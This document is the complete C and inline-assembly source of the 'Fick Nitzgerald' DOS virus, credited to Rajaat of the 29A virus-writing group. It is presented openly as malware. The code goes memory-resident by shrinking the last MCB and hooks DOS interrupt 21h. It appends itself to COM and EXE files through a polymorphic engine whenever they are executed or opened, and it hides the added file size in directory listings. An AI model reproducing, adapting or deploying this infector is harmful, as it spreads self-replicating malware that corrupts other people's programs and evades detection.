   /*****( Fick Nitzgerald Virus by Rajaat / 29A )********************************
   *
   * Virus name    : Fick Nitzgerald
   * Author        : Rajaat / 29A
   * Origin        : United Kingdom, January 1999
   * Compiling     : Use the included batch file.
   *                 Borland C++ 3.1 and Turbo Assembler required
   * Targets       : COM & EXE files
   * Size          : 1st generation = 6694 bytes
   *                 Others are 7326 bytes
   * Resident      : Yes
   * Polymorphic   : Yes
   * Encrypted     : No
   * Stealth       : File size stealth on 11/12 and 4e/4f
   * Tunneling     : No
   * Retrovirus    : Yes, it is not easy to research a HLL virus :-)
   * Antiheuristics: Not deliberately, but I think it will pass some checks
   * Peculiarities : It's mainly written in Borland C++ 3.1 with some alterations
   *                 to the startup code of the "tiny model" code (C0.ASM) and
   *                 inline assembly.
   * Drawbacks     : Extensive debugging needed and thorough knowledge of
   *                 compilers and how they work. This virus has been written
   *                 in a timespan of almost 3 years (started in March 1996).
   * Behaviour     : When an infected file is executed the virus first will
   *                 relocate it's code to a segment boundary, so that it
   *                 is always aligned at CS:0100, no matter where it
   *                 resides. If the file is not a first generation sample,
   *                 it will also have a polymorphic decryptor before
   *                 realigning takes place. Afther that the virus will
   *                 check if it is already resident by issueing its
   *                 "are-you-there" call. If it is not resident, it will
   *                 find the last MCB, shrink it, and moves its code to
   *                 the top of memory. Then it will hook DOS interrupt.
   *                 After the virus has installed itself in memory, it
   *                 will return control to the host. After the host
   *                 recieves control, the virus will try to infect COM and
   *                 EXE files that are opened or executed. If the virus
   *                 can infect the file, it tries to allocate a block of
   *                 memory as buffer for its polymorphic engine. If it
   *                 can't allocate the memory it will attach the virus
   *                 unencrypted at the end of the host file. If the virus
   *                 can have enough memory it will call it's engine and
   *                 writes the virus at the end of the host file.
   *                 Furthermore, when the virus is resident it will hide
   *                 the increase in filelength by monitoring the
   *                 FindFirst/FindNext (11/12/4e/4f) of DOS. I do realise
   *                 that the virus has become quite big in length, thats
   *                 the sacrifice I had to make for writing a virus in C.
   *
   *                 It's unknown what this virus might do besides replicate :)
   *
   * Ps.             This is my last virus I've written as 29A member, I hereby
   *                 want to thank the others for their friendship and support.
   *
   *                 Btw, please read the attached text to support me in writing
   *                 new things.
   *
   *
   ******************************************************************************/


   #pragma inline                          // sorry, some assembly is needed

   // Include some libraries I use
   #include <stdio.h>
   #include <stdlib.h>
   #include <string.h>
   #include <ctype.h>
   #include <conio.h>
   #include <dos.h>
   #include <dir.h>
   #include <mem.h>
   #include <io.h>
   #include <fcntl.h>
   #include <sys/stat.h>

   #define BreakPoint asm int 3;           // Included for testing purposes

   #define PING 0x30DE                     // are-you-there query
   #define PONG 0xB00B                     // are-you-there response
   #define DOSINT 0x21                     // take a guess

   #define virus_stealth_size 7326         // 11*0x29a (666)

   // Some typedefs to make my life easier
   typedef unsigned char BYTE;             // Bytes
   typedef unsigned int  WORD;             // Words
   typedef unsigned long DWORD;            // Doublewords
   typedef struct ffblk far *findrec;      // Needed for 4e/4f stealth

   // Needed for 11/12 stealth
   typedef struct dirblk {
       BYTE db_drive;
       char db_name[8];
       char db_ext[3];
       BYTE db_attrib;
       BYTE db_reserved1[10];
       WORD db_time;
       WORD db_date;
       WORD db_start;
       unsigned long db_filesize;
   } far *dirrec;

   // The infamous EXE header :-!
   typedef struct exe_header {
       WORD exe_id;                        // 0000
       WORD exe_last_page;                 // 0002
       WORD exe_pages;                     // 0004
       WORD exe_rel_cnt;                   // 0006
       WORD exe_hdr_size;                  // 0008
       WORD exe_min_mem;                   // 000A
       WORD exe_max_mem;                   // 000C
       WORD exe_SS;                        // 000E
       WORD exe_SP;                        // 0010
       WORD exe_crc;                       // 0012
       WORD exe_IP;                        // 0014
       WORD exe_CS;                        // 0016
       WORD exe_ofs_reloc;                 // 0018     also NEWexe check
       WORD exe_overlay;                   // 001A     must be 0
       DWORD exe_4bytes;                   // 001C
       WORD exe_behaviour;                 // 0020
       BYTE exe_reserved[25];              // 0022
       DWORD exe_offset_NE;                // 003C     SHOULD be 0
   } exe_header;

   // I need to call some interrupts, and using C these two are needed
   union REGS regs;
   static struct SREGS segregs;

   extern WORD DSEG;                       // DS, in C0.ASM and needed
   extern near virus_start;                // Start of the virus (in C0.ASM)
   extern near virus_end;                  // End of the virus (in C0.ASM)
   extern WORD pspseg;                     // Segment of PSP (in C0.ASM)
   extern void fse(void);                  // The poly engine (FSE.ASM)

   // Some prototyping here (hey, it's C!)
   int get_virus_size(void);
   int get_virus_memory(void);
   int get_virus_paragraphs(void);
   void interrupt int_21_handler(int bp, int di, int si, int ds, int es,
                                 int dx, int cx, int bx, int ax,
                                 int ip, int cs, int flags);

   // The old int 0x21 pointer is stored here
   void interrupt ( *old_int_21)(void);

   // The stack and start of an infected EXE file
   static WORD host_sp = 0;
   static WORD host_ss = 0;
   static WORD host_ip = 0;
   static WORD host_cs = 0;

   // The jump and infection marker for a COM file
   static unsigned char newbytes[4] = { 0xE9, 0, 0, '!'};

   // The original 1st 4 bytes of a COM host (in this case return to DOS)
   static unsigned char org4bytes[0x4] = { 0xCD, 0x20, 0x00, 0x5B };

   // Buffer for reading the exe header
   static exe_header exe_buffer;

   // And here some boasting :-D
   // Oh hell, I spelled his name wrong!
   static unsigned char virname[] = "[ Fick Nitzgerald Virus ]";
   static unsigned char author[] = "[ Rajaat / 29A ]";

   // EXE & COM entrypoint
   void main(void) {
       static int srcseg, srcofs;
       static int seg;
       static int ofs;

       _fmode =  O_BINARY;                 // filemode always binary
       old_int_21 = getvect(DOSINT);       // get dos int 21h ptr

       regs.x.ax = PING;                   // Check if already resident
       regs.x.bx = PONG;
       int86(DOSINT,&regs,&regs);

       if ((regs.x.ax != PONG) && (regs.x.bx != PING)) {

           // Install resident
           seg = getpsp()-1;               // get current mcb
           if (peekb(seg,0) == 'Z') {
               poke(seg,3,(peek(seg,3)-(get_virus_memory() >> 4)-1));
               poke(seg,0x12,(peek(seg,0x12)-(get_virus_memory() >> 4)-1));
               // nick now has enough memory at the top of dos memory
               seg = (peek(seg,0x12)-0x10);
               ofs = 0x100;
               srcseg = _CS;
               srcofs = &virus_start;
               movedata(srcseg,srcofs,seg,ofs,get_virus_size());   // move virus

               // hook dos int 21h
               regs.x.ax = 0x2521;
               regs.x.dx = FP_OFF(int_21_handler);
               segregs.ds = seg;
               int86x(DOSINT,&regs,&regs,&segregs);
               poke(seg,&DSEG,seg);
           }
       }
     if ((org4bytes[0] == 'M') && (org4bytes[1] == 'Z')) {
       // Return to EXE host
       asm {
         mov ah,0x51
         int 0x21
         mov es,bx
         mov ds,bx
         add bx,0x10
         mov cx,bx
         add cx,word ptr cs:[host_ss]
         add bx,word ptr cs:[host_cs]
         cli
         mov ss,cx
         mov sp,word ptr cs:[host_sp]
         sti
         push bx
         mov bx,word ptr cs:[host_ip]
         push bx
         xor bx,bx
         xor ax,ax
         retf
       }
     } else {
       // Return to COM host
       movedata(_CS,FP_OFF(org4bytes),pspseg,0x100,4);
       asm {
         mov ax,pspseg
         mov ss,ax
         mov ds,ax
         mov es,ax
         push ax
         mov si,0feh
         cmpsw
         push si
         xor ax,ax
         retf
       }
     }
     return;
   }

   // Get virus length
   int get_virus_size(void) {
       asm lea ax,virus_end;
       asm sub ax,offset virus_start;
       _AX += 0x80;           // reserve some extra space
       return _AX;
   }

   // Get virus memory length
   int get_virus_memory(void) {
       return (get_virus_size());
   }

   // Get virus size in paragraphs
   int get_virus_paragraphs(void) {
     return ((get_virus_size() / 10) + 1);
   }

   // Resident INT 21h handler
   void interrupt int_21_handler(int bp, int di, int si, int ds, int es,
                                 int dx, int cx, int bx, int ax,
                                 int ip, int cs, int flags) {
       WORD temp;
       char far *ch;
       exe_header *exe_hdr;
       static int handle;
       static int stats;
       static long filelength;
       static long ne_offset;
       static ldiv_t lx;
       findrec searchdtarec;
       dirrec searchdirrec;
       static struct ftime filedate;
       static char filename[128] = { "This space is reserved for holding the " \
                                     "filename for internal use only! ;-) "};
       static int segp;
       static int nread;

       // Installation check
       if ((ax == PING) && (bx == PONG)) {
           temp = ax;
           ax = bx;
           bx = temp;
           return;
           }

       // File execute
       temp = ax >> 8;
       // FCB FindFirst/FindNext
       if ((temp == 0x11) || (temp == 0x12)) {
           _DS = ds;
           _DX = dx;
           _AX = ax;
           asm {
               pushf
               call dword ptr cs:[old_int_21]
               or al,al
               jz fcb_ok
               jmp error
           }
           fcb_ok:
           asm push ax;
           searchdirrec = getdta();
           if (searchdirrec->db_drive == 0xff)
              searchdirrec = getdta()+7;           // extended fcb
           temp = searchdirrec->db_time & 0x1f;    // get seconds
           if (temp == 30) {                       // 60? (vienna shit)
             searchdirrec->db_filesize -= virus_stealth_size;  // substract virus
             searchdirrec->db_time -= 10;                      // and time :-)
           }
           asm pop ax;
           goto error;
       }
       // DOS FindFirst/FindNext
       if ((temp == 0x4e) || (temp == 0x4f)) {
           _DS = ds;
           _DX = dx;
           _CX = cx;
           _AX = ax;
           asm {
               pushf
               call dword ptr cs:[old_int_21]
               jc error
           }
           asm push ax;
           searchdtarec = getdta();
           temp = searchdtarec->ff_ftime & 0x1f;
           if (temp == 30) {                       // 60 seconds again?
             searchdtarec->ff_fsize -= virus_stealth_size;     // yups, hide virus
             searchdtarec->ff_ftime -= 10;                     // and seconds
           }
           asm pop ax;
           error:
           asm {
               mov sp,bp
               pop bp
               pop di
               pop si
               pop ds
               pop es
               pop dx
               pop cx
               pop bx
               add sp,2
               clc
               or al,al
               jz no_stc
               stc
           }
           no_stc:
           asm retf 2;
       }
       if ((ax == 0x4b00) || (ax == 0x3d00) || (ax == 0x4300) || (ax == 0x6c00)) {
           // replication part, invoced on execute, open, attrib and extopen
           _DS = _CS;
           nread = 0;
           ch = MK_FP(ds,dx);
           if (ax == 0x6c00) ch = MK_FP(ds,si);    // handle extopen ds:si > ds:dx
           do {                                    // copy and upcase filename
             filename[nread] = toupper(*ch);
             nread++;
             ch++;
           } while (filename[nread-1] != '\0');

           _DS = _CS;
           _ES = _CS;
           if ((strstr(filename,".COM") != NULL) ||        // com extension?
               (strstr(filename,".EXE") != NULL)) {        // exe extension?
             handle = _open(filename,O_RDWR);              // open file
             if (handle != -1) {                           // no error?
               getftime(handle, &filedate);                // store filedate/time
               _read(handle, org4bytes, 0x4);              // read 4 bytes
               if ((org4bytes[0] == 'M') && (org4bytes[1] == 'Z')) {
                   // EXE file
                   lseek(handle,0L,SEEK_SET);
                   _read(handle,&exe_buffer,sizeof(exe_buffer));   // read header
                   if ((exe_buffer.exe_overlay == 0) &&            // no overlay?
                       (exe_buffer.exe_crc != 0x29A)) {            // not infected?
                       ne_offset = lseek(handle, exe_buffer.exe_offset_NE, SEEK_SET);
                       filelength = lseek(handle,0L,SEEK_END);
                       lx = ldiv(filelength, 0x200);
                       lx.quot += 1;
                       if (ne_offset == 0) ne_offset=filelength+1;
                       if ((filelength < ne_offset) &&
                          (exe_buffer.exe_ofs_reloc < 0x60) &&
                          ((WORD) lx.quot == exe_buffer.exe_pages) &&
                          ((WORD) lx.rem == exe_buffer.exe_last_page)) {
                           // ok, no overlays, and no windows exe (strange check)
                           // now store original stack and entrypoint
                           host_ss = exe_buffer.exe_SS;
                           host_sp = exe_buffer.exe_SP;
                           host_cs = exe_buffer.exe_CS;
                           host_ip = exe_buffer.exe_IP;
                           lx = ldiv(filelength, 0x10);
                           lx.quot -= exe_buffer.exe_hdr_size;
                           // fill new entrypoint (virus) in header
                           exe_buffer.exe_CS = (WORD) lx.quot-0x10;
                           exe_buffer.exe_IP = (WORD) lx.rem+0x100;
                           exe_buffer.exe_SS = (WORD) lx.quot;
                           exe_buffer.exe_SP = (get_virus_size() | 1)+0x301;
                           exe_buffer.exe_min_mem += get_virus_paragraphs();
                           stats = allocmem(get_virus_paragraphs()+10, &segp);
                           if (stats == -1) {          // enough memory?
                               // Poly code here
                             _CX = get_virus_size();
                             ch = MK_FP(segp, 0);
                             _SI = &virus_start;
                             _ES = segp;
                             _DI = 0;
                             _AX = exe_buffer.exe_IP;
                             fse();                    // my fucking small engine
                             _ES = _CS;
                             _DS = _CS;
                             _dos_write(handle, ch, virus_stealth_size, &stats);
                             freemem(segp);            // free memory used by fse
                           } else
                             // Not enough memory, so we just don't poly
                             _write(handle,&virus_start,virus_stealth_size);
                           filelength = lseek(handle,0L, SEEK_END);
                           lx = ldiv(filelength, 0x200);
                           // update exe pagecount
                           exe_buffer.exe_pages = (WORD) lx.quot;
                           exe_buffer.exe_last_page = (WORD) lx.rem;
                           exe_buffer.exe_pages++;
                           // and set infection marker (checksum field)
                           exe_buffer.exe_crc = 0x29A;
                           lseek(handle,0L, SEEK_SET);
                           _write(handle,&exe_buffer,sizeof(exe_buffer));
                           filedate.ft_tsec = 30;      // is 60!
                           setftime(handle, &filedate);
                         }
                   }
               } else {
                 // COM file
                 if (org4bytes[3] != '!') {            // already infected?
                   filelength = lseek(handle,0L, SEEK_END);
                   if ((filelength < 0xf000) && (filelength > 0x100)) {
                     // file is not too long
                     stats = allocmem(get_virus_paragraphs()+10, &segp);
                     if (stats == -1) {
                       // Poly code here
                       _CX = get_virus_size();
                       ch = MK_FP(segp, 0);
                       _SI = &virus_start;
                       _ES = segp;
                       _DI = 0;
                       _AX = filelength + 0x100;
                       fse();                          // what was it again? ;-)
                       _ES = _CS;
                       _DS = _CS;
                       _dos_write(handle, ch, virus_stealth_size, &stats);
                       freemem(segp);
                     } else
                        // Not enough memory, so we just don't poly
                       _write(handle,&virus_start,virus_stealth_size);
                     lseek(handle,0L, SEEK_SET);
                     filelength -= 3;                  // calc com jump to virus
                     newbytes[1] = filelength & 0xff;
                     newbytes[2] = (filelength >> 8) & 0xff;
                     _write(handle,newbytes,4);
                     filedate.ft_tsec = 30;            // is 60!
                     setftime(handle, &filedate);
                   }
                 }
               }
               _close(handle);                         // we're done...
           }

         }
         goto eoi_21;
       };

   // Chain to old interrupt
   eoi_21:
   ;
   asm {
       mov sp,bp
       pop bp
       pop di
       pop si
       pop ds
       pop es
       pop dx
       pop cx
       pop bx
       pop ax
       jmp dword ptr cs:[old_int_21]
   }

   }

   // Oh, eh... Raid, this isn't a host encrypting prepending non resident
   // infector, this is the real McCoy (I hope you can stand a joke, but you
   // get the drift).
